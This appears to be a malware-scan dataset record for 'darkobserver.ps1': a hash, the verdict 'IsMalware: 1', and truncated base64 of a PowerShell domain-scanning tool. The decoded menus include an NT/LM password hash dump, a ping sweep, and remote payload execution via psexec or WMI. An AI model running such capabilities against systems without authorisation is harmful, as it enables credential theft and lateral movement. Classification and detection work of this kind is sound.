darkobserver.ps1,93ff5fde4701851a042574624781aeea,Scan result is 32768. IsMalware: 1,w6/Cu8K/I1JlcXVpcmVzIC1WZXJzaW9uIDIuMAoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIwkJU1RBUlQgTWVudSBGdW5jdGlvbnMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgCgpGdW5jdGlvbiBBc2NpaUFydAp7Cglzd2l0Y2goJChHZXQtUmFuZG9tKDYpKSkKCXsKCQkweyBXcml0ZS1Ib3N0IEAnCgkJCgkJCiAgICAgICAgICAgICAgICAgICAgX19fX19fICAgICAgICAgICAgICAgX18gICAgICAgIF9fX19fX18gX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgfCAgIF8gIFwgLi0tLS4tLi0tLS0ufCAgfC0tLiAgIHwgICBfICAgfCAgfC0tLi0tLS0tLi0tLS0tLi0tLS0uLS0uLS0uLS0tLS0uLS0tLS4KICAgICAgICAgICAgICAgICAgIHwuICB8ICAgXHwgIF8gIHwgICBffHwgICAgPCAgICB8LiAgfCAgIHwgIF8gIHxfXyAtLXwgIC1fX3wgICBffCAgfCAgfCAgLV9ffCAgIF98CiAgICAgICAgICAgICAgICAgICB8LiAgfCAgICBcX19fLl98X198ICB8X198X198ICAgfC4gIHwgICB8X19fX198X19fX198X19fX198X198ICBcX19fL3xfX19fX3xfX3wgIAogICAgICAgICAgICAgICAgICAgfDogIDEgICAgLyAgICAgICAgICAgICAgICAgICAgIHw6ICAxICAgfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgIHw6Oi4uIC4gLyAgICAgICAgICAgICAgICAgICAgICB8OjouLiAuIHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICBgLS0tLS0tJyAgICAgICAgICAgICAgICAgICAgICAgYC0tLS0tLS0nICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgoJCQkJICAgCidAfQogICAgICAgIDF7V3JpdGUtSG9zdCBAJwoJCQoJCQogICAgICAgICAgICAgICAgICAgICBfICAgICAgICAgKClfKCkgICAgICBfICAgICAgICAgLi0uICAgICBfX18gICBvb18gICAgd1d3KClfKCl3V3cgICAgd1d3d1d3KClfKCkgIAogICAgICAgICAgICAgICAgICAgL3x8XyAgIC8pICAoTyBvfE9PKSAuJyApICAgICAgYyhPX08pYyAgKF9fXylfLyAgXyktPCAoTykoTyBvKShPKSAgICAoTykoTykoTyBvKSAgCiAgICAgICAgICAgICAgICAgICAgL29fKShvKShPKSB8Xl9cfHxfLyAuJyAgICAgICwnLi0tLS5gLCAoTykoTylcX18gYC4gIC8gX18pXl9cKCBcICAgIC8gKS8gX18pXl9cICAKICAgICAgICAgICAgICAgICAgIC8gfChcIC8vXFwgIHwoXykpICAgLyAgICAgICAvIC98X3xffFwgXC8gIF9cICAgIGAuIHwvICggIHwoXykpXCBcICAvIC8vICggIHwoXykpIAogICAgICAgICAgICAgICAgICAgfCB8ICkpKF9fKXwgfCAgL3x8XCBcICAgICAgIHwgXF9fX19fLyB8fCB8XykpICAgX3wgKCAgXykgfCAgLyAvICBcLyAgKCAgXykgfCAgLyAgCiAgICAgICAgICAgICAgICAgICB8IHwvLy8sLS4gfCApfFwoL1wpXCBgLiAgICAgJy4gYC0tLScgLmB8IHxfKSksLScgICB8XCBcXyApfFxcIFwgYC0tJyAvXCBcXyApfFxcICAKICAgICAgICAgICAgICAgICAgIFxfXy8tJyAgICcnKC8gIFwpICAgYC5fKSAgICAgIGAtLi4uLScgICguJy0nKF8uLi0tJyAgXF9ffC8gIFwpIGAtLi4tJyAgXF9ffC8gIFwpCiAgCiAgCidAfQoJCTJ7V3JpdGUtSG9zdCBAJwogIAogIAogICAgICAgICAgICAgX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgX198X18gICB8X18gX19fXyAgIF9fX19fICBfXyAgX18gICBfX3xfXyAgIHxfXyBfX19fX18gX19fX19fIF9fX19fXyBfX19fXyBfXyAgICBfX19fX19fIF9fX19fICAgCiAgICAgICAgICB8ICAgICBcICAgICB8ICAgIFwgfCAgICAgfHwgIHwvIC8gIC8gICAgIFwgICAgIHwgICAgICA+ICAgX19ffCAgIF9fX3wgICAgIFwgIFwgIC8vICAgX19ffCAgICAgfCAgCiAgICAgICAgICB8ICAgICAgXCAgICB8ICAgICBcfCAgICAgXHwgICAgIFwgIHwgICAgIHwgICAgIHwgICAgIDwgYC0uYC0ufCAgIF9fX3wgICAgIFxcICBcLy98ICAgX19ffCAgICAgXCAgCiAgICAgICAgICB8X19fX19fLyAgX198X198XF9fXF9ffFxfX1xfX3xcX19cIFxfX19fXy8gICBfX3xfX19fX18+X19fX19ffF9fX19fX3xfX3xcX19cXF9fLyB8X19fX19ffF9ffFxfX1wgCiAgICAgICAgICAgICB8X19fX198ICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxfX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgCiAgCidAfQoJCTN7V3JpdGUtSG9zdCBAJwoKCQkKICAgICAgICAgICAgICAgIFxfX19fX18gXCBfX19fXyBfX19fX19ffCAgfCBfXyBcX19fX18gIFxcXyB8X18gICBfX19fX18gX19fX19fX19fX19fX18gIF9fIF9fX19fX19fX19fIAogICAgICAgICAgICAgICAgIHwgICAgfCAgXFxfXyAgXFxfICBfXyBcICB8LyAvICAvICAgfCAgIFx8IF9fIFwgLyAgX19fLy8gX18gXF8gIF9fIFwgIFwvIC8vIF9fIFxfICBfXyBcCiAgICAgICAgICAgICAgICAgfCAgICBgICAgXC8gX18gXHwgIHwgXC8gICAgPCAgLyAgICB8ICAgIFwgXF9cIFxcX19fIFxcICBfX18vfCAgfCBcL1wgICAvXCAgX19fL3wgIHwgXC8KICAgICAgICAgICAgICAgIC9fX19fX19fICAoX19fXyAgL19ffCAgfF9ffF8gXCBcX19fX19fXyAgL19fXyAgL19fX18gID5cX19fICA+X198ICAgIFxfLyAgXF9fXyAgPl9ffCAgIAogICAgICAgICAgICAgICAgICAgICAgICBcLyAgICAgXC8gICAgICAgICAgIFwvICAgICAgICAgXC8gICAgXC8gICAgIFwvICAgICBcLyAgICAgICAgICAgICAgICAgXC8gICAgIAoKCQkKJ0B9CgkJNHtXcml0ZS1Ib3N0IEAnCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fXyAgICAgICAgICAgICAgICAgICAgX19fIF8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyAgIFxfXyBfIF8gX198IHwgX18gICAvX19fXCB8X18gIF9fXyAgX19fIF8gX19fXyAgIF9fX19fIF8gX18gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyAvXCAvIF9gIHwgJ19ffCB8LyAvICAvLyAgLy8gJ18gXC8gX198LyBfIFwgJ19fXCBcIC8gLyBfIFwgJ19ffAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLyAvXy8vIChffCB8IHwgIHwgICA8ICAvIFxfLy98IHxfKSBcX18gXCAgX18vIHwgICBcIFYgLyAgX18vIHwgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgL19fXywnIFxfXyxffF98ICB8X3xcX1wgXF9fXy8gfF8uX18vfF9fXy9cX19ffF98ICAgIFxfLyBcX19ffF98ICAKCgonQH0KCQk1e1dyaXRlLUhvc3QgQCcKCgkJCiAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fX18sX19fXyxfX19fLCBfXywgLCAgX19fXywgX19fXyBfX19fLF9fX18sX19fXyxfXyAgXyxfX19fLF9fX18sIAogICAgICAgICAgICAgICAgICAgICAgICAgICgtfCAgKC0vX3woLXxfXykoIHxfLyAgKC0vICBcKC18X198LShfXygtfF8sKC18X198LVwgIC8oLXxfLCgtfF9fKSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgX3xfXy8vICB8LF98ICBcLF98IFwsICBfXF9fLyxffF9fKV9fX18pX3xfXyxffCAgXCxfXC8gIF98X18sX3wgIFwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgKCAgICggICAgICggICAgICggICAgICAoICAgICAoICAgICggICAgKCAgICAoICAgICAoICAgICggICAgKCAgICAgIAoKCQkKJ0B9CiB9Cn0KCkZ1bmN0aW9uIFJlc2l6ZSAjc2V0IGNvbnNvbGUgc2l6ZQp7CglpZiAoJGhvc3QuTmFtZSAtZXEgJ0NvbnNvbGVIb3N0JykgCgl7CgkJJFdpZHRoID0gMTIwCgkJJGhlaWdodCA9IDQ1CgkJCgkJIyBidWZmZXIgc2l6ZSBjYW4ndCBiZSBzbWFsbGVyIHRoYW4gd2luZG93IHNpemUKCQlpZiAoJFdpZHRoIC1ndCAkaG9zdC5VSS5SYXdVSS5CdWZmZXJTaXplLldpZHRoKSB7CgkJCSRob3N0LlVJLlJhd1VJLkJ1ZmZlclNpemUgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QuU2l6ZSAtQXJndW1lbnRMaXN0ICgkV2lkdGgsICRob3N0LlVJLlJhd1VJLkJ1ZmZlclNpemUuSGVpZ2h0KQoJCX0KCgkJIyBpZiB3aWR0aCBpcyB0b28gbGFyZ2UsIHNldCB0byBtYXggYWxsb3dlZCBzaXplCgkJaWYgKCRXaWR0aCAtZ3QgJGhvc3QuVUkuUmF3VUkuTWF4UGh5c2ljYWxXaW5kb3dTaXplLldpZHRoKSB7CgkJCSRXaWR0aCA9ICRob3N0LlVJLlJhd1VJLk1heFBoeXNpY2FsV2luZG93U2l6ZS5XaWR0aAoJCX0KCgkJIyBpZiBoZWlnaHQgaXMgdG9vIGxhcmdlLCBzZXQgdG8gbWF4IGFsbG93ZWQgc2l6ZQoJCWlmICgkSGVpZ2h0IC1ndCAkaG9zdC5VSS5SYXdVSS5NYXhQaHlzaWNhbFdpbmRvd1NpemUuSGVpZ2h0KSB7CgkJCSRIZWlnaHQgPSAkaG9zdC5VSS5SYXdVSS5NYXhQaHlzaWNhbFdpbmRvd1NpemUuSGVpZ2h0CgkJfQoKCQkjIHNldCB3aW5kb3cgc2l6ZQoJCSRob3N0LlVJLlJhd1VJLldpbmRvd1NpemUgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QuU2l6ZSAtQXJndW1lbnRMaXN0ICgkV2lkdGgsICRIZWlnaHQpCgl9Cn0KCiNDaGFuZ2UgdGV4dCBjb2xvciB0byB5ZWxsb3cgd2hlbiBwcm9tcHRpbmcgYSB1c2VyIGZvciBpbnB1dApGdW5jdGlvbiBSZWFkWWVsbG93CnsKCVtjb25zb2xlXTo6Rm9yZWdyb3VuZENvbG9yID0gInllbGxvdyIKCSRpbnB1dCA9IFJlYWQtSG9zdCAKCVtjb25zb2xlXTo6Rm9yZWdyb3VuZENvbG9yID0gIndoaXRlIgoJUmV0dXJuICRpbnB1dAp9CgojTWFrZSB0ZW1wb3JhcnkgZGlyZWN0b3J5IGZvciBzY2FuIGRhdGEgYmVmb3JlIHBhcnNpbmcKRnVuY3Rpb24gQ3JlYXRlVGVtcERpcgp7CgkkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gIlN0b3AiCglmb3IoJGk9MDsgJGkgLWx0IDE1OyAkaSsrKQoJewoJCXRyeSB7CgkJCWlmICgoVGVzdC1QYXRoICRURU1QX0RJUiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkgLWVxICR0cnVlKQoJCQl7CgkJCQlSZW1vdmUtSXRlbSAtUmVjdXJzZSAtRm9yY2UgIiRURU1QX0RJUlwqIgoJCQl9CgkJCW1rZGlyIC1QYXRoICRURU1QX0RJUiAtRm9yY2UgfCBPdXQtTnVsbAoJCQlicmVhawoJCX0gY2F0Y2ggewoJCQlzbGVlcCAxCgkJfQoJfQoJaWYoJGkgLWVxIDMwKQoJewoJCVdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBSZWQgIlVuYWJsZSB0byBjcmVhdGUgdGVtcG9yYXJ5IGRpcmVjdG9yeTogJFRFTVBfRElSIgoJCUV4aXRGdW5jdGlvbgoJfQp9CgojQ2hlY2sgZm9yIGFkbWluIHJpZ2h0cyBhbmQgcHNleGVjCkZ1bmN0aW9uIENoZWNrRGVwZW5kYW5jaWVzCnsKCXBhcmFtKCRQU1NjcmlwdFJvb3QpCgkKCSNDaGVjayB0aGF0IHVzZXIgaXMgYSBEb21haW4gQWRtaW4KCXRyeSB7CgkJJGFkbWluPShbQURTSVNFQVJDSEVSXSJzYW1hY2NvdW50bmFtZT0kKCRlbnY6VVNFUk5BTUUpIikuRmluZG9uZSgpLlByb3BlcnRpZXMubWVtYmVyb2YgfAoJCVNlbGVjdC1TdHJpbmcgIkRvbWFpbiBBZG1pbnMiCgl9IENhdGNoIHt9CgogICAgaWYoJGFkbWluKQogICAgeyAKICAgICAgICAkU2NyaXB0OkFkbWluUHJpdnMgPSAkdHJ1ZQogICAgfQoJZWxzZSB7JFNjcmlwdDpBZG1pblByaXZzID0gJGZhbHNlfQoJCgkjQWRkIGN1cnJlbnQgZGlyZWN0b3J5IHRvIHBhdGgKCSRlbnY6cGF0aCA9ICRlbnY6cGF0aCsiOy5cIgoJCgkjQ2hlY2sgZm9yIHByZXNlbmNlIG9mIHBzZXhlYyBhbmQgc3RvcmUgdG8gYSB2YXJpYWJsZSBpbiAkc2NhbiBoYXNoIHRhYmxlCiAgICB0cnkgeyAKCQlpZiAodGVzdC1wYXRoIC5ccHNleGVjLmV4ZSkKCQl7CgkJCSRzY3JpcHQ6c2Nhbi5wc2V4ZWMgPSBHZXQtQ29tbWFuZCAiLlxwc2V4ZWMuZXhlIiAtRXJyb3JBY3Rpb24gU3RvcAoJCQlSZXR1cm4KCQl9CgkJZWxzZWlmKCRzY3JpcHQ6c2Nhbi5wc2V4ZWMgPSBHZXQtQ29tbWFuZCAicHNleGVjLmV4ZSIgLUVycm9yQWN0aW9uIFN0b3Ape1JldHVybn0KCQkKICAgIH0gQ2F0Y2ggeyAgI3BzZXhlYyBub3QgaW4gcGF0aC4gQ2hlY2sgaW4gc2NyaXB0IGRpcmVjdG9yeQoJCWlmICh0ZXN0LXBhdGggJFBTU2NyaXB0Um9vdFxwc2V4ZWMuZXhlKQoJCXsKCQkJJHNjcmlwdDpzY2FuLnBzZXhlYyA9IEdldC1Db21tYW5kICIkUFNTY3JpcHRSb290XHBzZXhlYy5leGUiCgkJfQoJCWVsc2UKCQl7CgkJCVdyaXRlLVdhcm5pbmcgIlVuYWJsZSB0byBmaW5kIHBzZXhlYy5leGUgaW4geW91ciBQQVRILiAgUGF5bG9hZHMgd2lsbCBkZWZhdWx0IHRvIFdNSSBmb3IgcmVtb3RlIGV4ZWN1dGlvbiIKCQkJUmV0dXJuCgkJfQkKICAgIH0KfQoKI0luaXRpYWwgbWVudSBwcmVzZW50ZWQgdG8gc3RhcnQgc2NhbnMKRnVuY3Rpb24gRGlzcGxheU1lbnUKewoJI2tlZXAgbG9vcGluZyB1bnRpbCBpbnB1dCBpcyB2YWxpZAoJd2hpbGUoJHRydWUpewoJCVdyaXRlLUhvc3QgIgpDaG9vc2Ugc2NhbiB0eXBlOgoKICAgIFsxXSAgU1RBTkRBUkQKICAgIFsyXSAgQURWQU5DRUQKCkNob2ljZTogIiAtTm9OZXdMaW5lCgkJJFNjYW5UeXBlID0gUmVhZFllbGxvdwoJCXN3aXRjaCgkU2NhblR5cGUpCgkJewoJCQkxe0NsZWFyLUhvc3Q7IGlmKC1ub3QgKERpc3BsYXlTdGFuZGFyZE1lbnUpKXtSZXR1cm59fQoJCQkye0NsZWFyLUhvc3Q7IGlmKC1ub3QgKERpc3BsYXlBZHZhbmNlZE1lbnUpKXtSZXR1cm59fQoJCQkiaCJ7Q2xlYXItSG9zdDsgUmV0dXJufQoJCQkiaG9tZSJ7Q2xlYXItSG9zdDsgUmV0dXJufQoJCQkieCJ7RXhpdEZ1bmN0aW9ufQoJCQkiZXhpdCJ7RXhpdEZ1bmN0aW9ufQoJCQlkZWZhdWx0e1dyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBSZWQgIkludmFsaWQgQ2hvaWNlOiAkU2NhblR5cGUifQoJCX0KCX0KfQoKRnVuY3Rpb24gRGlzcGxheVN0YW5kYXJkTWVudQp7CglXcml0ZS1Ib3N0ICIKV2hpY2ggc2NhbiBkbyB5b3Ugd2FudCB0byBwZXJmb3JtPwoKICAgIFswXSAgQUxMCiAgICBbMV0gIFVzZXIgRXhlY3V0YWJsZSBFbnVtZXJhdGlvbgogICAgWzJdICBVU0IgZW51bWVyYXRpb24KICAgIFszXSAgQXV0by1SdW4gZGlzYWJsZWQKICAgIFs0XSAgU3RhcnQtdXAgUHJvZ3JhbXMKICAgIFs1XSAgU2NoZWR1bGVkIHRhc2tzCiAgICBbNl0gIFJ1bm5pbmcgUHJvY2Vzc2VzCiAgICBbN10gIERyaXZlciBRdWVyeQogICAgWzhdICBTZXJ2aWNlIFF1ZXJ5CiAgICBbOV0gIE5ldHdvcmsgQ29ubmVjdGlvbnMKICAgIFsxMF0gSW5zdGFsbGVkIFNvZnR3YXJlCiAgICBbMTFdIE5ldHdvcmsgU2hhcmVzCiAgICBbMTJdIE5ldHdvcmsgU2hhcmVzIFBlcm1pc3Npb25zCiAgICBbMTNdIEFudGl2aXJ1cyBTdGF0dXMKICAgIFsxNF0gTG9jYWwgYWNjb3VudHMKICAgIFsxNV0gRG9tYWluIGFjY291bnRzCgkJCkNob2ljZTogIiAtTm9OZXdMaW5lCgkkU2NhbkNob2ljZSA9IFJlYWRZZWxsb3cKCVdyaXRlLUhvc3QgIiIKCXN3aXRjaCgkU2NhbkNob2ljZSkKCXsKCQkiaCJ7Q2xlYXItSG9zdDsgUmV0dXJuICRmYWxzZX0KCQkiaG9tZSJ7Q2xlYXItSG9zdDsgUmV0dXJuICRmYWxzZX0KCQkieCJ7RXhpdEZ1bmN0aW9ufQoJCSJleGl0IntFeGl0RnVuY3Rpb259CgkJMTJ7CgkJCSNJZiBuZXR3b3JrIHNoYXJlcyBwZXJtaXNzaW9ucyBpcyBjaG9zZW4gbWFrZSBzdXJlIHRoYXQgbmV0d29yayBzaGFyZXMgZGF0YSBpcyBwcmVzZW50LgoJCQkjSWYgTmV0d29yayBzaGFyZXMgc2NhbiBoYXMgbm90IGJlZW4gcnVuIHRoZW4gcnVuIGl0IGJlZm9yZSBuZXR3b3JrIHNoYXJlcyBwZXJtaXNzaW9ucy4KCQkJaWYoLW5vdCAoKGdjaSAiJE9VVF9ESVJcTmV0d29ya1NoYXJlcyouY3N2IikgLW9yIChnY2kgIiRPVVRfRElSXENTVlxOZXR3b3JrU2hhcmVzKi5jc3YiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkpCgkJCXsJCQkJCgkJCQkkU2NhbkNob2ljZSA9ICIxMSwxMiIKCQkJfQoJCX0KCX0KCVBhcnNlTWVudUNob2ljZSAkU2NhbkNob2ljZSAxNSB8ICV7CgkJJFNjcmlwdDpTY2FuQ2hvaWNlQXJyYXkuYWRkKCRfKXxPdXQtTnVsbAoJfQp9CgpGdW5jdGlvbiBEaXNwbGF5QWR2YW5jZWRNZW51CnsKCVdoaWxlKCR0cnVlKQoJewoJCVdyaXRlLUhvc3QgIgpXaGljaCBzY2FuIGRvIHlvdSB3YW50IHRvIHBlcmZvcm0/CgogICAgWzFdICBGaWxlLVR5cGUgU2VhcmNoCiAgICBbMl0gIExvZ2dlZCBvbiB1c2VycyAKICAgIFszXSAgUGluZyBTd2VlcCAKICAgIFs0XSAgSG90LUZpeCBFbnVtZXJhdGlvbgogICAgWzVdICBOVC9MTSBwYXNzd29yZCBoYXNoIGR1bXAgKFdpbjcrKQogICAgWzZdICBGaWxlIGhhc2hlciAoV2luNyspCiAgICBbN10gIFZpcnVzLVRvdGFsIGhhc2ggYW5hbHlzaXMKCQkKQ2hvaWNlOiAiIC1Ob05ld0xpbmUKCQkkQWR2U2NhbkNob2ljZSA9IFJlYWRZZWxsb3cKCgkJc3dpdGNoICgkQWR2U2NhbkNob2ljZSkKCQl7CgkJCTF7aWYoLW5vdCAoRmlsZVR5cGVTZWFyY2gpKXtSZXR1cm59fQoJCQkye2lmICgtbm90IChMb2dnZWRPblVzZXJzKSl7UmV0dXJufX0KCQkJM3tpZiAoLW5vdCAoUGluZ1N3ZWVwKSl7UmV0dXJufX0KCQkJNHsKCQkJCVdyaXRlLUhvc3QKCQkJCSRTY3JpcHQ6U2NhbkNob2ljZUFycmF5LmFkZCgiMTYiKQoJCQkJUmV0dXJuCgkJCX0KCQkJNXsKCQkJCVdyaXRlLUhvc3QKCQkJCSRTY3JpcHQ6U2NhbkNob2ljZUFycmF5LmFkZCgiMTEwIikKCQkJCVJldHVybgoJCQl9CgkJCTZ7CgkJCQlXcml0ZS1Ib3N0CgkJCQkkU2NyaXB0OlNjYW5DaG9pY2VBcnJheS5hZGQoIjExMSIpCgkJCQlSZXR1cm4KCQkJfQoJCQk3e2lmICgtbm90IChWVEhhc2hBbmFseXNpcykpe1JldHVybn19CgkJCQoJCQkiaCJ7Q2xlYXItSG9zdDsgcmV0dXJuICRmYWxzZX0KCQkJImhvbWUie0NsZWFyLUhvc3Q7IHJldHVybiAkZmFsc2V9CgkJCSJ4IntFeGl0RnVuY3Rpb259CgkJCSJleGl0IntFeGl0RnVuY3Rpb259CgkJCWRlZmF1bHR7V3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiSW52YWxpZCBDaG9pY2U6ICRTY2FuVHlwZSJ9CgkJfQoJfQp9CgpGdW5jdGlvbiBQYXJzZU1lbnVDaG9pY2UKewoJcGFyYW0oJENob2ljZSwgJFRvdGFsQ2hvaWNlcykKCQoJI0NyZWF0ZSBhIHRlbXBvcmFyeSBhcnJheSB0byBzdG9yZSB0aGUgZGlmZmVyZW50IGNvbW1hIHNlcGFyYXRlZCBzY2FuIGNob2ljZXMKCSRUZW1wQ2hvaWNlQXJyYXkgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKCSRDaG9pY2UgPSAkQ2hvaWNlLnNwbGl0KCIsIikgfCAleyRfLnRyaW0oKX0KCQoJI2lmIHRoZSBhcnJheSBvbmx5IGhhcyAxIGl0ZW0gZG8gdGhpcwoJaWYoLW5vdCAkQ2hvaWNlLmNvdW50IC1vciAkQ2hvaWNlLmNvdW50IC1lcSAxKQoJewoJCSRUZW1wQ2hvaWNlQXJyYXkuQWRkKCRDaG9pY2UpfG91dC1udWxsCgkJCgkJI2Nob2ljZSBvZiAwIG1lYW5zIHBlcmZvcm0gYWxsIHNjYW5zLiAgCgkJaWYoJFRlbXBDaG9pY2VBcnJheVswXSAtZXEgIjAiKQoJCXsKCQkJJFRlbXBDaG9pY2VBcnJheS5DbGVhcigpCgkJCQoJCQkjRmlsbCBhcnJheSB3aXRoIHZhbHVlcyBmcm9tIDEgdG8gdG90YWwgbnVtYmVyIG9mIGNob2ljZXMKCQkJZm9yKCRpPTE7ICRpIC1sZSAkVG90YWxDaG9pY2VzOyAkaSsrKXskVGVtcENob2ljZUFycmF5LkFkZCgkaSl8b3V0LW51bGx9CgkJCVJldHVybiAkVGVtcENob2ljZUFycmF5CgkJfQoJfQkKCQoJZWxzZQoJewoJCSNhZGQgZWFjaCBjb21tYSBzZXBhcmF0ZWQgaXRlbSB0byB0aGUgYXJyYXkKCQlmb3IoJGk9MDsgJGkgLWx0ICRDaG9pY2UuY291bnQ7ICRpKyspCgkJewoJCQkkVGVtcENob2ljZUFycmF5LkFkZCgkQ2hvaWNlWyRpXSkgfG91dC1udWxsCgkJfQoJfQoKCSNzdGVwIHRocm91Z2ggZWFjaCBjaG9pY2UgaW4gVGVtcENob2ljZUFycmF5Cglmb3IoJGk9MDsgJGkgLWx0ICRUZW1wQ2hvaWNlQXJyYXkuY291bnQ7ICRpKyspCgl7CgkJI1Rlc3QgaWYgY2hvaWNlIGNvbnRhaW5zIGEgIi0iIHJlcHJlc2VudGluZyBhIHJhbmdlIG9mIG51bWJlcnMgKGkuZS4gNC04KQoJCWlmICgkVGVtcENob2ljZUFycmF5WyRpXSB8IHNlbGVjdC1zdHJpbmcgIi0iKQoJCXsKCQkJI3NwbGl0IHRoZSByYW5nZSBhbmQgdGVzdCB0aGF0IHRoZXkgYXJlIGRpZ2l0cwoJCQkkSW50UmFuZ2UgPSAoJFRlbXBDaG9pY2VBcnJheVskaV0pLnNwbGl0KCItIikKCQkJZm9yKCRqPTA7ICRqIC1sZSAxOyAkaisrKQoJCQl7CgkJCQlpZiAoICRJbnRSYW5nZVskal0gfCBzZWxlY3Qtc3RyaW5nICJeXGQkIikKCQkJCXsKCQkJCQkkSW50UmFuZ2VbJGpdID0gW2NvbnZlcnRdOjpUb0ludDMyKCRJbnRSYW5nZVskal0sIDEwKQoJCQkJfQoJCQl9CgkJCSNmaWxsIGluIHRoZSBudW1lcmljIHZhbHVlcyBiZXR3ZWVuIHRoZSByYW5nZQoJCQkkSW50UmFuZ2U9KCRJbnRSYW5nZVswXSAuLiAkSW50UmFuZ2VbMV0pCgkJCWZvcigkaj0wOyAkaiAtbHQgJEludFJhbmdlLmNvdW50OyAkaisrKQoJCQl7CgkJCQkjYWRkIGVhY2ggaXRlbSBpbiB0aGUgaW50ZWdlciByYW5nZSB0byB0aGUgdGVtcCBhcnJheQoJCQkJJFRlbXBDaG9pY2VBcnJheS5BZGQoJEludFJhbmdlWyRqXSl8b3V0LW51bGwKCQkJfQoJCQkjcmVtb3ZlIHRoZSBpdGVtIHRoYXQgcmVwcmVzZW50cyB0aGUgcmFuZ2UgZnJvbSB0aGUgdGVtcCBhcnJheQoJCQkkVGVtcENob2ljZUFycmF5LlJlbW92ZSgkVGVtcENob2ljZUFycmF5WyRpXSl8b3V0LW51bGwKCQkJCgkJCSNyZXN0YXJ0IHRoZSBsb29wIHVudGlsIGFsbCBjaG9pY2UgcmFuZ2VzIGhhdmUgYmVlbiBleHBhbmRlZAoJCQkkaSA9IC0xCgkJfQoJfQoJCglmb3IoJGk9MDsgJGkgLWx0ICRUZW1wQ2hvaWNlQXJyYXkuY291bnQ7ICRpKyspCgl7CgkJI2NvbnZlcnQgdG8gYmFzZSAxMCBpbnRlZ2VyCgkJJFRlbXBDaG9pY2VBcnJheVskaV0gPSBbY29udmVydF06OlRvSW50MzIoJFRlbXBDaG9pY2VBcnJheVskaV0sIDEwKSAKCX0KCQoJI3JldHVybiBzb3J0ZWQgYXJyYXkKCSRUZW1wQ2hvaWNlQXJyYXkgPSAkVGVtcENob2ljZUFycmF5IHwgc29ydAoJUmV0dXJuICRUZW1wQ2hvaWNlQXJyYXkKfQoKI0dldCBsb2NhdGlvbiB0byBzYXZlIGRhdGEKRnVuY3Rpb24gU2V0T3V0RmlsZQp7CglwYXJhbSgkQ3VycmVudENob2ljZSkKCSRpbnB1dCA9IFJlYWRZZWxsb3cKCWlmKC1ub3QgJGlucHV0KSAjbm8gdXNlciBpbnB1dCBzYXZlIGZpbGUgaW4gY3VycmVudCBkaXJlY3RvcnkKCXsKCQkjQ3VycmVudCBjaG9pY2UgaXMgdXNlcnMgY3VycmVudCBkaXJlY3RvcnkKCQlpZigkQ3VycmVudENob2ljZSAtZXEgJChHZXQtTG9jYXRpb24pLnBhdGgpCgkJewoJCQkkKEdldC1Mb2NhdGlvbikucGF0aCsiXFNjYW5zJHt0b2RheX0iCgkJCSQoR2V0LUxvY2F0aW9uKS5wYXRoKyJcU2NhbnMke3RvZGF5fV9URU1QIiAKCQkJJHNjcmlwdDpPVVRfRElSX3Jvb3QgPSAkQ3VycmVudENob2ljZQoJCQlyZXR1cm4KCQl9CgkJCgkJI1VzZXIgY2hhbmdlZCBkZWZhdWx0IGNob2ljZS4gIE1ha2Ugc3VyZSBjaG9pY2UgaXMgZnVsbCBwYXRoCgkJZWxzZQoJCXsKCQkJJGlucHV0ID0gKEdldC1JdGVtICIkQ3VycmVudENob2ljZSIpLkZ1bGxOYW1lICNmdWxsIHBhdGggbmVlZGVkIGZvciBzY3JpcHQgdG8gcnVuIHByb3Blcmx5CgkJCSIke2lucHV0fVNjYW5zJHt0b2RheX0iCgkJCSIke2lucHV0fVNjYW5zJHt0b2RheX1fVEVNUCIKCQkJJHNjcmlwdDpPVVRfRElSX3Jvb3QgPSAkQ3VycmVudENob2ljZQoJCQlyZXR1cm4KCQl9Cgl9CgllbHNlICNjaG9pY2UgY2hhbmdlZCBmcm9tIGN1cnJlbnRseSBzdG9yZWQgdmFsdWUKCXsKCQlpZigtbm90IChUZXN0LVBhdGggJGlucHV0IC1QYXRoVHlwZSBDb250YWluZXIpKSAjcGF0aCBtdXN0IGJlIGEgZGlyZWN0b3J5CgkJewoJCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgUmVkICIgICRpbnB1dCBkb2VzIG5vdCBleGlzdCBvciBpcyBub3QgYSBkaXJlY3RvcnkuIgoJCQlyZXR1cm4gJGZhbHNlCgkJfQoJCWVsc2UgI3BhdGggaXMgYSBkaXJlY3RvcnkKCQl7CgkJCSRpbnB1dCA9IChHZXQtSXR